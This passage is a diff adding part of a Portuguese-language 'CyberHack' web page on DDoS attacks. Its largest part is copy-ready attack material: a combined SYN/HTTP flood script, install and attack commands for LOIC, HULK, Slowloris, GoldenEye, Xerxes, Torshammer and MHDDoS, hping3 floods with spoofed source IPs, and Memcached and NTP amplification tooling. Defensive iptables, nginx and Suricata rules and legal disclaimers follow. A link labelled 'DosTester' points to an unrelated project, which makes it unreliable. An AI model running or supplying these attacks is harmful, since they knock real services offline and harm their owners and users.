+                                    <p>Ferramentas modernas permitem combinar ataques de camada de rede/transporte (Layer 4) com ataques de aplicação (Layer 7).</p>
+                                    
+                                    <div class="cmd-block">
+                                        <pre># Script combinando SYN Flood e HTTP Flood
+#!/bin/bash
+# Inicia SYN Flood em background
+hping3 -S --flood -p 80 [IP-ALVO] &
+SYN_PID=$!
+# Inicia HTTP Flood
+ab -n 1000000 -c 1000 http://[SITE-ALVO]/
+# Encerra SYN Flood
+kill $SYN_PID</pre>
+                                        <button class="copy-btn">Copiar</button>
+                                    </div>
+                                    
+                                    <p>Este script shell combina um ataque SYN Flood (Layer 4) com HTTP Flood (Layer 7) para maior eficácia.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section id="ferramentas" class="content-section">
+                    <h2 class="section-title">Ferramentas Avançadas de DDoS</h2>
+                    <p>Existem diversas ferramentas disponíveis para testes de resistência a ataques DDoS. Lembre-se que o uso destas ferramentas deve ser restrito a ambientes controlados e com as devidas autorizações.</p>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-server"></i>
+                            </div>
+                            <h3 class="tool-name">LOIC (Low Orbit Ion Cannon)</h3>
+                        </div>
+                        <p class="tool-description">Uma ferramenta de estresse de rede que realiza ataques DoS através de inundação de pacotes UDP, TCP ou HTTP. Foi popularizada pelo grupo Anonymous.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Interface gráfica simples</li>
+                                <li>Suporte a ataques TCP, UDP e HTTP</li>
+                                <li>Permite controle sobre threads e velocidade</li>
+                                <li>Modo "IMMA CHARGIN MAH LAZER" para ataques máximos</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Instalação no Kali Linux
+apt-get install mono-complete
+wget https://github.com/NewEraCracker/LOIC/releases/download/1.0.8/LOIC_1.0.8.0_binary.zip
+unzip LOIC_1.0.8.0_binary.zip
+mono LOIC.exe</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Comando para ataque via linha de comando
+mono LOIC.exe /target:[SITE-ALVO] /port:80 /method:HTTP /threads:100</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-rocket"></i>
+                            </div>
+                            <h3 class="tool-name">HOIC (High Orbit Ion Cannon)</h3>
+                        </div>
+                        <p class="tool-description">Sucessora da LOIC, focada em ataques HTTP POST/GET com capacidade de contornar defesas comuns usando "boosters" personalizáveis.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Suporte a até 256 threads simultâneos</li>
+                                <li>Scripts personalizáveis (boosters) para evasão de defesas</li>
+                                <li>Ataques HTTP mais sofisticados</li>
+                                <li>Suporte a múltiplos alvos simultâneos</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-output">
+                            <pre># HOIC possui apenas interface gráfica
+# Exemplo de configuração de booster (arquivo .hoic):
+
+&lt;response&gt;
+accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+accept-language: en-us
+user-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
+referer: http://www.google.com
+connection: Keep-Alive
+cookie: ASPSESSIONIDQQDCQCSR=ODIPBAAAMEEPNKNKJHEPMIAB; PHPSESSID=33qv9v7v2gq2t9v98kc3uuvhc1
+content-length: 37
+cache-control: no-cache
+&lt;/response&gt;</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-hammer"></i>
+                            </div>
+                            <h3 class="tool-name">HULK (HTTP Unbearable Load King)</h3>
+                        </div>
+                        <p class="tool-description">Ferramenta especializada em ataques de Layer 7 (HTTP) que gera tráfego altamente ofuscado e difícil de filtrar, evitando métodos de defesa comuns.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Geração de URLs aleatórias para evitar cache</li>
+                                <li>User-Agents aleatórios</li>
+                                <li>Referrers aleatórios</li>
+                                <li>Evita cookies/fingerprinting</li>
+                                <li>Mantém conexões vivas</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Download e instalação
+git clone https://github.com/grafov/hulk
+cd hulk
+python hulk.py http://[SITE-ALVO]/</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Versão Go (mais potente)
+git clone https://github.com/grafov/hulk-1
+cd hulk-1
+go build hulk.go
+./hulk -site http://[SITE-ALVO]/ -agents 100</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-radiation"></i>
+                            </div>
+                            <h3 class="tool-name">Slowloris</h3>
+                        </div>
+                        <p class="tool-description">Ataque de negação de serviço que utiliza um número mínimo de recursos para derrubar servidores web, mantendo conexões HTTP abertas por longos períodos.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Ataque "low and slow" (baixo e lento)</li>
+                                <li>Eficaz contra Apache, nginx (configurações padrão)</li>
+                                <li>Difícil de detectar em logs tradicionais</li>
+                                <li>Requer poucos recursos do atacante</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre>git clone https://github.com/gkbrk/slowloris.git
+cd slowloris
+python3 slowloris.py [SITE-ALVO] -p 80 -s 500 -v</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-output">
+                            <pre># Opções importantes:
+-p [PORT]      - Porta alvo (padrão: 80)
+-s [SOCKETS]   - Número de sockets (padrão: 150)
+-v             - Modo verboso
+-ua            - Rotação de User-Agent
+--https        - Usar HTTPS
+--proxy        - Usar proxy (formato: host:porta)</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-bolt"></i>
+                            </div>
+                            <h3 class="tool-name">GoldenEye</h3>
+                        </div>
+                        <p class="tool-description">Ferramenta de teste de resistência HTTP DoS baseada em ataques Keep-Alive + No-Cache, desenhada para testar resistência de aplicações web.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Baseado no conceito do Slowloris, mas mais agressivo</li>
+                                <li>Utiliza técnicas de keepalive e cabeçalhos aleatórios</li>
+                                <li>Suporte a HTTPS</li>
+                                <li>Gerador de tráfego aleatório</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre>git clone https://github.com/jseidl/GoldenEye.git
+cd GoldenEye
+chmod +x goldeneye.py
+./goldeneye.py http://[SITE-ALVO]/ -w 50 -s 100 -m random</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-output">
+                            <pre># Opções principais:
+-u / --useragents      - Arquivo com user agents
+-w / --workers         - Número de workers concorrentes
+-s / --sockets         - Número de sockets por worker
+-m / --method          - Método HTTP (get, head, post, random)
+-d / --debug           - Modo de debug
+-h / --help            - Ajuda</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-skull-crossbones"></i>
+                            </div>
+                            <h3 class="tool-name">Xerxes</h3>
+                        </div>
+                        <p class="tool-description">Ferramenta poderosa de DoS que ataca servidores web com uma inundação massiva de conexões HTTP.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Alta eficiência em ataques TCP/HTTP</li>
+                                <li>Implementação em C para máxima performance</li>
+                                <li>Versões melhoradas disponíveis no GitHub</li>
+                                <li>Ataques de múltiplos vetores simultâneos</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre>git clone https://github.com/XCHADXFAQ77X/XERXES.git
+cd XERXES
+gcc -o xerxes xerxes.c
+./xerxes [SITE-ALVO] 80</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Versão melhorada (Xerxes 2)
+git clone https://github.com/zanyarjamal/xerxes.git
+cd xerxes
+./xerxes -h [SITE-ALVO] -p 80 -t 100</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-satellite-dish"></i>
+                            </div>
+                            <h3 class="tool-name">Hping3</h3>
+                        </div>
+                        <p class="tool-description">Ferramenta avançada de linha de comando para análise e geração de pacotes TCP/IP, amplamente utilizada para testes de firewall e ataques DoS.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Suporte a TCP, UDP, ICMP e pacotes RAW-IP</li>
+                                <li>Modo flood para ataques DoS</li>
+                                <li>Capacidade de spoofing de IP</li>
+                                <li>Fragmentação de pacotes</li>
+                                <li>Controle preciso sobre parâmetros de pacotes</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Instalação
+apt-get install hping3</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># SYN Flood
+hping3 -S --flood -V -p 80 [IP-ALVO]</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># SYN Flood com IP Spoofing (IP aleatório)
+hping3 -S --flood -V -p 80 -a 0.0.0.0 --rand-source [IP-ALVO]</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># ICMP Flood
+hping3 --icmp --flood -V [IP-ALVO]</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># UDP Flood
+hping3 --udp --flood -V -p 53 [IP-ALVO]</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># ACK Flood
+hping3 -A --flood -V -p 80 [IP-ALVO]</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-bomb"></i>
+                            </div>
+                            <h3 class="tool-name">Torshammer</h3>
+                        </div>
+                        <p class="tool-description">Ferramenta de ataque DoS de camada 7 (aplicação) que utiliza a rede Tor para anonimizar os ataques, tornando mais difícil o bloqueio por IP.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>Utiliza a rede Tor para anonimato</li>
+                                <li>Ataque HTTP POST com alto uso de recursos</li>
+                                <li>Eficiente mesmo com poucos recursos</li>
+                                <li>Pode contornar sistemas WAF comuns</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre>git clone https://github.com/dotfighter/torshammer.git
+cd torshammer
+python2 torshammer.py -t [SITE-ALVO] -r 500</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-output">
+                            <pre># Opções principais:
+-t / --target       - Alvo (URL ou IP)
+-r / --threads      - Número de threads (padrão: 256)
+-p / --port         - Porta destino (padrão: 80)
+-T / --tor          - Usar rede Tor (necessita proxy Tor)
+-h / --help         - Ajuda</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-header">
+                            <div class="tool-icon">
+                                <i class="fas fa-cloud-upload-alt"></i>
+                            </div>
+                            <h3 class="tool-name">MHDDoS</h3>
+                        </div>
+                        <p class="tool-description">Uma ferramenta DDoS massiva com 56 métodos de ataque diferentes, incluindo ataques de amplificação DNS, NTP, SNMP e mais.</p>
+                        
+                        <div class="tool-features">
+                            <ul class="feature-list">
+                                <li>56 métodos de ataque diferentes</li>
+                                <li>Suporte a proxies (SOCKS4, SOCKS5, HTTP)</li>
+                                <li>Suporte a ataques de amplificação</li>
+                                <li>Opções de alto desempenho</li>
+                                <li>Modo CLI avançado</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre>git clone https://github.com/MatrixTM/MHDDoS.git
+cd MHDDoS
+pip3 install -r requirements.txt
+python3 start.py</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Exemplo de ataque HTTP
+python3 start.py HTTP [URL] 5 1000 socks5.txt 100 100</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Exemplo de ataque TCP
+python3 start.py TCP [IP] [PORTA] 5 1024 socks5.txt 100 100</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-output">
+                            <pre># Formatos de comando:
+python3 start.py [MÉTODO] [IP/URL] [PORTA] [THREADS] [PACOTE_SIZE] [LISTA_PROXIES] [DURAÇÃO]
+
+# Métodos disponíveis incluem:
+TCP, UDP, SYN, VSE, HTTP, STRESS, SLOWLORIS, MEMCACHED, NTP, DNS e outros</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                </section>
+
+                <section id="amplificacao-avancada" class="content-section">
+                    <h2 class="section-title">Técnicas de Amplificação Avançadas</h2>
+                    <p>Os ataques de amplificação são particularmente devastadores pois permitem que um atacante com recursos limitados gere volumes massivos de tráfego.</p>
+                    
+                    <div class="alert-box warning">
+                        <p><strong>IMPORTANTE:</strong> Estas técnicas são especialmente perigosas e frequentemente usadas em ataques DDoS de grande escala. Experimente apenas em laboratórios isolados com permissão explícita.</p>
+                    </div>
+                    
+                    <table class="comparison-table">
+                        <thead>
+                            <tr>
+                                <th>Protocolo</th>
+                                <th>Fator de Amplificação</th>
+                                <th>Porta</th>
+                                <th>Método</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Memcached</td>
+                                <td>51.000x</td>
+                                <td>11211</td>
+                                <td>Comando "stats"</td>
+                            </tr>
+                            <tr>
+                                <td>NTP</td>
+                                <td>556x</td>
+                                <td>123</td>
+                                <td>Comando "monlist"</td>
+                            </tr>
+                            <tr>
+                                <td>DNS</td>
+                                <td>54x</td>
+                                <td>53</td>
+                                <td>Consulta ANY</td>
+                            </tr>
+                            <tr>
+                                <td>CLDAP</td>
+                                <td>56x</td>
+                                <td>389</td>
+                                <td>Consulta rootDSE</td>
+                            </tr>
+                            <tr>
+                                <td>SSDP</td>
+                                <td>30x</td>
+                                <td>1900</td>
+                                <td>Descoberta M-SEARCH</td>
+                            </tr>
+                            <tr>
+                                <td>SNMP</td>
+                                <td>6x</td>
+                                <td>161</td>
+                                <td>GetBulkRequest</td>
+                            </tr>
+                            <tr>
+                                <td>LDAP</td>
+                                <td>46x</td>
+                                <td>389</td>
+                                <td>SearchRequest</td>
+                            </tr>
+                            <tr>
+                                <td>NetBIOS</td>
+                                <td>3.8x</td>
+                                <td>137</td>
+                                <td>Name query</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    
+                    <div class="attack-type">
+                        <h3 class="attack-name">Ataque de Amplificação Memcached</h3>
+                        <p class="attack-description">O ataque de amplificação Memcached explora servidores Memcached mal configurados e expostos à internet para gerar ataques DDoS volumétricos massivos.</p>
+                        
+                        <div class="cmd-block">
+                            <pre>git clone https://github.com/649/Memcrashed-DDoS-Exploit.git
+cd Memcrashed-DDoS-Exploit
+pip3 install -r requirements.txt
+python3 Memcrashed.py</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-output">
+                            <pre># No menu interativo:
+1. Use a ferramenta Shodan para listar servidores Memcached
+2. Defina o IP da vítima
+3. Defina a porta da vítima
+4. Inicie o ataque</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <p>Este ataque gerou alguns dos maiores ataques DDoS da história, incluindo um ataque de 1,7 Tbps contra o GitHub em 2018.</p>
+                    </div>
+                    
+                    <div class="attack-type">
+                        <h3 class="attack-name">Ataque de Amplificação NTP</h3>
+                        <p class="attack-description">Explora o comando monlist do protocolo NTP (Network Time Protocol) para gerar respostas significativamente maiores que as requisições.</p>
+                        
+                        <div class="cmd-block">
+                            <pre># Verificar se um servidor NTP é vulnerável
+ntpdc -n -c monlist [IP-SERVIDOR-NTP]</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre>git clone https://github.com/vpnguy-zz/ntpDDoS.git
+cd ntpDDoS
+python2 ntpDDoS.py [IP-SPOOFADO] [IP-ALVO] [ARQUIVO-SERVIDORES-NTP]</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                </section>
+
+                <section id="defesa" class="content-section">
+                    <h2 class="section-title">Defesa Contra Ataques DDoS</h2>
+                    <p>Compreender as técnicas de DDoS é fundamental para desenvolver estratégias de defesa eficazes. Abaixo estão algumas das principais técnicas de mitigação.</p>
+                    
+                    <div class="defense-method">
+                        <h3 class="defense-name">Filtragem de Tráfego</h3>
+                        <p class="defense-description">Implementação de filtros de tráfego para identificar e bloquear pacotes maliciosos antes que cheguem ao servidor alvo.</p>
+                        
+                        <div class="cmd-block">
+                            <pre># Bloqueio de pacotes SYN em massa com iptables
+iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
+iptables -A INPUT -p tcp --syn -j DROP</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Limitação de conexões ICMP (proteção contra ping flood)
+iptables -A INPUT -p icmp -m limit --limit 1/s --limit-burst 4 -j ACCEPT
+iptables -A INPUT -p icmp -j DROP</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="defense-method">
+                        <h3 class="defense-name">Aumento de Capacidade</h3>
+                        <p class="defense-description">Aumento da largura de banda, distribuição de carga e redundância de servidores para absorver o impacto de ataques volumétricos.</p>
+                        
+                        <div class="cmd-block">
+                            <pre># Configuração Nginx para balanceamento de carga
+http {
+    upstream backend {
+        server backend1.example.com;
+        server backend2.example.com;
+        server backend3.example.com;
+    }
+
+    server {
+        listen 80;
+        server_name example.com;
+
+        location / {
+            proxy_pass http://backend;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+        }
+    }
+}</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="defense-method">
+                        <h3 class="defense-name">Rate Limiting</h3>
+                        <p class="defense-description">Implementação de limites de taxa para restringir o número de requisições de um único IP ou rede em um período de tempo.</p>
+                        
+                        <div class="cmd-block">
+                            <pre># Rate limiting no Nginx
+http {
+    limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
+    
+    server {
+        location /login/ {
+            limit_req zone=one burst=5;
+            # ...
+        }
+    }
+}</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Rate limiting no Apache (mod_evasive)
+&lt;IfModule mod_evasive20.c&gt;
+    DOSHashTableSize 3097
+    DOSPageCount 2
+    DOSSiteCount 50
+    DOSPageInterval 1
+    DOSSiteInterval 1
+    DOSBlockingPeriod 10
+    DOSEmailNotify admin@example.com
+&lt;/IfModule&gt;</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="defense-method">
+                        <h3 class="defense-name">Serviços Anti-DDoS</h3>
+                        <p class="defense-description">Utilização de serviços especializados como Cloudflare, AWS Shield, Akamai, ou Imperva para mitigação de ataques DDoS.</p>
+                        
+                        <p>Estes serviços utilizam redes globais de datacenters para absorver ataques volumétricos, filtrar tráfego malicioso e permitir apenas tráfego legítimo ao servidor de origem.</p>
+                        
+                        <div class="cmd-output">
+                            <pre># Exemplo de regra Cloudflare Firewall
+# Bloqueia IPs que fazem mais de 100 requisições em 1 minuto
+(http.request.uri.path eq "/wp-login.php" and ip.src ne 192.0.2.1)
+and (http.request.rate.count gt 100 and http.request.rate.period eq 60)</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                    
+                    <div class="defense-method">
+                        <h3 class="defense-name">Análise de Tráfego Anômalo</h3>
+                        <p class="defense-description">Implementação de sistemas de detecção de intrusão (IDS) e sistemas de prevenção de intrusão (IPS) para identificar e bloquear padrões de tráfego suspeito.</p>
+                        
+                        <div class="cmd-block">
+                            <pre># Instalação do Suricata IDS/IPS
+apt-get install suricata
+suricata -c /etc/suricata/suricata.yaml -i eth0</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                        
+                        <div class="cmd-block">
+                            <pre># Regra Suricata para detectar SYN Flood
+alert tcp any any -> $HOME_NET any (msg:"Possível SYN Flood"; 
+flow:stateless; flags:S; threshold:type threshold, track by_dst, 
+count 1000, seconds 5; sid:10001; rev:1;)</pre>
+                            <button class="copy-btn">Copiar</button>
+                        </div>
+                    </div>
+                </section>
+
+                <section id="legal" class="content-section">
+                    <h2 class="section-title">Aspectos Legais e Éticos</h2>
+                    <p>A realização de ataques DDoS sem autorização é ilegal na maioria dos países e pode resultar em consequências legais graves.</p>
+                    
+                    <div class="alert-box">
+                        <p><strong>AVISO LEGAL:</strong> No Brasil, ataques DDoS não autorizados podem ser enquadrados nos artigos 266 e 267 da Lei 12.737/2012 (Lei Carolina Dieckmann), com penas que podem chegar a 5 anos de reclusão.</p>
+                    </div>
+                    
+                    <div class="info-list">
+                        <li>Realize testes de DDoS apenas em infraestrutura sob sua responsabilidade ou com autorização explícita por escrito</li>
+                        <li>Jamais utilize ferramentas de DDoS contra sites governamentais, serviços essenciais ou infraestrutura crítica</li>
+                        <li>Prefira ambientes de laboratório isolados para testes</li>
+                        <li>Mantenha registros detalhados de todas as autorizações e testes realizados</li>
+                        <li>Utilize ferramentas como o <a href="https://github.com/dosbox-staging/dosbox-staging">DosTester</a> que são específicas para testes controlados</li>
+                    </div>
+                    
+                    <div class="alert-box info">
+                        <p><strong>USO ÉTICO:</strong> O conhecimento sobre ataques DDoS deve ser aplicado para fortalecer defesas, realizar testes de resistência autorizados e melhorar a segurança de sistemas. Profissionais éticos contribuem para a proteção da internet, não para sua disrupção.</p>
+                    </div>
+                </section>
+            </div>
+            
+            <div class="toc">
+                <h3 class="toc-title">Índice</h3>
+                <ul class="toc-list">
+                    <li><a href="#introducao">O que é um ataque DDoS?</a></li>
+                    <li><a href="#tipos">Tipos de Ataques DDoS</a></li>
+                    <li><a href="#ferramentas">Ferramentas Avançadas</a></li>
+                    <li><a href="#amplificacao-avancada">Técnicas de Amplificação</a></li>
+                    <li><a href="#defesa">Defesa Contra DDoS</a></li>
+                    <li><a href="#legal">Aspectos Legais e Éticos</a></li>
+                </ul>
+                
+                <div style="margin-top: 30px;">
+                    <div class="progress-container">
+                        <div class="progress-bar" style="width: 0%"></div>
+                        <div class="progress-label">Progresso de Leitura: 0%</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <a href="#" id="top-btn"><i class="fas fa-arrow-up"></i></a>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-logo">CyberHack</div>
+                <div class="footer-links">
+                    <a href="index.html">Home</a>
+                    <a href="#legal">Aspectos Legais</a>
+                    <a href="contato.html">Contato</a>
+                </div>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-discord"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="digital-numbers">ID: <span id="random-numbers">29384756</span></div>
+
+    <script>
+        // Partículas de fundo com Three.js
+        const canvas = document.getElementById('canvas');
+        const renderer = new THREE.WebGLRenderer({
+            canvas,
+            antialias: true,
+            alpha: true
+        });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setPixelRatio(window.devicePixelRatio);
+
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.z = 5;
+
+        const particlesGeometry = new THREE.BufferGeometry();
+        const particlesCount = 2000;
+        
+        const positions = new Float32Array(particlesCount * 3);
+        const colors = new Float32Array(particlesCount * 3);
+        const sizes = new Float32Array(particlesCount);
+        
+        for (let i = 0; i < particlesCount * 3; i += 3) {
+            positions[i] = (Math.random() - 0.5) * 20;
+            positions[i + 1] = (Math.random() - 0.5) * 20;
+            positions[i + 2] = (Math.random() - 0.5) * 20;
+            
+            colors[i] = Math.random() * 0.5 + 0.5;
+            colors[i + 1] = Math.random() * 0.2;
+            colors[i + 2] = Math.random() * 0.5 + 0.5;
+            
+            sizes[i/3] = Math.random() * 0.5 + 0.5;
+        }
+        
+        particlesGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+        particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+        particlesGeometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));
+        
+        const particlesMaterial = new THREE.PointsMaterial({
+            size: 0.1,
+            vertexColors: true,
+            transparent: true,
+            opacity: 0.8,
+            sizeAttenuation: true,
+            map: createCircleTexture()
+        });
+        
+        function createCircleTexture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 64;
+            canvas.height = 64;
+            
+            const context = canvas.getContext('2d');
+            context.clearRect(0, 0, canvas.width, canvas.height);
+            
+            const centerX = canvas.width / 2;
+            const centerY = canvas.height / 2;
+            const radius = canvas.width / 2.5;
+            
+            context.beginPath();
+            context.arc(centerX, centerY, radius, 0, 2 * Math.PI, false);
+            
+            const gradient = context.createRadialGradient(centerX, centerY, 0, centerX, centerY, radius);
+            gradient.addColorStop(0, 'rgba(255, 255, 255, 1)');
+            gradient.addColorStop(0.5, 'rgba(255, 105, 180, 0.8)');
+            gradient.addColorStop(1, 'rgba(255, 105, 180, 0)');
+            
+            context.fillStyle = gradient;
+            context.fill();
+            
+            const texture = new THREE.Texture(canvas);
+            texture.needsUpdate = true;
+            return texture;
+        }
+        
+        const particles = new THREE.Points(particlesGeometry, particlesMaterial);
+        scene.add(particles);
+
+        let mouseX = 0;
+        let mouseY = 0;
+        let targetX = 0;
+        let targetY = 0;
+        
+        document.addEventListener('mousemove', (event) => {
+            mouseX = (event.clientX / window.innerWidth) * 2 - 1;
+            mouseY = -(event.clientY / window.innerHeight) * 2 + 1;
+        });
+
+        function animate() {
+            requestAnimationFrame(animate);
+            
+            targetX = mouseX * 0.2;
+            targetY = mouseY * 0.2;
+            
+            particles.rotation.x += 0.0005;
+            particles.rotation.y += 0.001;
+            
+            particles.rotation.y += (targetX - particles.rotation.y) * 0.05;
+            particles.rotation.x += (targetY - particles.rotation.x) * 0.05;
+            
+            const positions = particles.geometry.attributes.position.array;
+            for (let i = 0; i < positions.length; i += 3) {
+                positions[i + 1] += Math.sin(Date.now() * 0.001 + positions[i] * 0.1) * 0.002;
+            }
+            particles.geometry.attributes.position.needsUpdate = true;
+            
+            renderer.render(scene, camera);
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        animate();
+
+        // Tabs
+        const tabBtns = document.querySelectorAll('.tab-btn');
+        const tabContents = document.querySelectorAll('.tab-content');
+        
+        tabBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const tabId = btn.getAttribute('data-tab');
+                
+                tabBtns.forEach(b => b.classList.remove('active'));
+                tabContents.forEach(c => c.classList.remove('active'));
+                
+                btn.classList.add('active');
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+
+        // Copy buttons
+        const copyBtns = document.querySelectorAll('.copy-btn');
+        
+        copyBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const cmd = btn.previousElementSibling.textContent;
+                navigator.clipboard.writeText(cmd);
+                
+                const originalText = btn.textContent;
+                btn.textContent = 'Copiado!';
+                
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                }, 2000);
+            });
+        });
+
+        // Progress bar
+        function updateProgressBar() {
+            const windowHeight = window.innerHeight;
+            const fullHeight = document.body.scrollHeight - windowHeight;
+            const scrolled = window.scrollY;
+            
+            const progress = (scrolled / fullHeight) * 100;
+            document.querySelector('.progress-bar').style.width = `${progress}%`;
+            document.querySelector('.progress-label').textContent = `Progresso de Leitura: ${Math.round(progress)}%`;
+        }
+        
+        window.addEventListener('scroll', updateProgressBar);
+        updateProgressBar();
+
+        // Back to top button
+        const topBtn = document.getElementById('top-btn');
+        
+        window.addEventListener('scroll', () => {
+            if (window.scrollY > 300) {
+                topBtn.classList.add('active');
+            } else {
+                topBtn.classList.remove('active');
+            }
+        });
+        
+        topBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+
+        // Random numbers
+        setInterval(() => {
+            document.getElementById('random-numbers').textContent = Math.floor(Math.random() * 100000000).toString();
+        }, 1000);
+
+        // Modal de acesso negado
+        document.addEventListener('DOMContentLoaded', function() {
+            const accessDeniedModal = document.createElement('div');
+            accessDeniedModal.id = 'accessDeniedModal';
+            accessDeniedModal.style.display = 'none';
